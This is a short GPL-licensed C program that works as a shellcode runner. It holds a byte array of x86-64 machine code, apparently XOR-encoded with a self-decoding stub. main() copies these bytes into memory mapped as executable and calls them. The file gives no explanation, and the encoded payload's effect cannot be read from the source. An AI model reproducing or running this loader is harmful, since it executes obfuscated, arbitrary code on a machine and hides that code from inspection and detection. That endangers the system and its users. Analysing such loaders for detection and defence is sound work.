/*
    Copyright (C) 2023  Maurice Lambert
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = "\x48\x31\xc9\x48\x81\xe9\xf9\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\xb0\x1d\x22\xf6\x8b\x86\xb8\xe6\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xf8\xa5\x0d"
"\x94\xe2\xe8\x97\x95\xd8\x1d\xbb\xa6\xdf\xd9\xea\x80\xd8"
"\x30\x41\xa2\xd5\xd4\x50\xf7\xb0\x1d\x22\x93\xe8\xee\xd7"
"\xc6\xf8\x78\x4e\x9a\xe4\xa6\xef\x89\xc2\x71\x46\xf6\xdd"
"\xd1\xec\xb8\xda\x26\x7a\xf9\x8e\x86\xb8\xe6";

int main(int argc, char **argv) {
    void *exec = mmap(0, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
